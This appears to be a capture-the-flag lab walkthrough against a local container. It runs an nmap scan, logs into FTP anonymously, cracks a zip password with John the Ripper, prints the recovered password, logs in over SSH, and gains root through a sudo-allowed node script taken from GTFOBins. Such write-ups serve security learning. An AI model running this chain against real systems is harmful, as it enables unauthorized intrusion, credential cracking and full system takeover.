![image](https://github.com/user-attachments/assets/adcd6845-d524-4280-afaf-d6457ee0434d)
```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p21,22 172.17.0.2 -oN targeted
```
![Pasted image 20250124140335](https://github.com/user-attachments/assets/e31d89b5-00fc-40b9-8c6e-b1fe16f73aa4)

## **we have the user "anonymous" enabled by FTP so we will try to connect to it**
```bash
ftp 172.17.0.2
```
![Pasted image 20250124140805](https://github.com/user-attachments/assets/cf8641f0-0280-4a87-b3c1-7f24f8226942)

## **we will download this file and unzip it to see the content.**
```bash
get secretitopicaron.zip
```
![Pasted image 20250124142008](https://github.com/user-attachments/assets/8d5306b3-dd33-4b44-bd11-a18bbaf35a5c)

## **when decompressing, it asks for a password so we will do a brute force attack.**
```bash
zip2john secretitopicaron.zip > secret.hash
```
```bash
john --wordlist=/usr/share/wordlist/rockyou.txt secret.hash
```
![Pasted image 20250124142714](https://github.com/user-attachments/assets/a93d40c1-bbad-4272-9cb6-d9fb8f507ddd)
![Pasted image 20250124142740](https://github.com/user-attachments/assets/d10ae2e0-eebb-4b2a-b333-5114fae2725c)

## **now unzip the file**
```bash
unzip secretitopicaron.zip
```
![Pasted image 20250124142933](https://github.com/user-attachments/assets/d77f3aee-7dfa-4451-82d5-f4ae7b1dc434)
laKontraseñAmasmalotaHdelbarrioH

## **now we will try to connect via SSH**
```bash
ssh mario172.17.0.2
```
![Pasted image 20250124143113](https://github.com/user-attachments/assets/c97b2b5e-ee7d-4351-a9c6-d61bdfc95c37)

## **we are already in, now we just need to elevate privileges.**
```bash
sudo -l
```
![Pasted image 20250124143814](https://github.com/user-attachments/assets/949d0298-a93d-405c-b935-f3613f755a06)
![Pasted image 20250124143838](https://github.com/user-attachments/assets/5716b271-641b-4ff9-9a8d-d9ee8df09533)

## **here is the file**

![Pasted image 20250124143955](https://github.com/user-attachments/assets/d6705f56-99f7-4113-99b1-6e3f06cb8df4)

## **we make a TTY treatment**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## **paste inside the code we got from the gtobins web site**

![Pasted image 20250124145128](https://github.com/user-attachments/assets/925b16e9-806b-4dcb-9db5-d631facc808c)

## **now run the file from the application**
```bash
sudo /usr/bin/node /home/mario/script.js
```

## **We are ROOT**




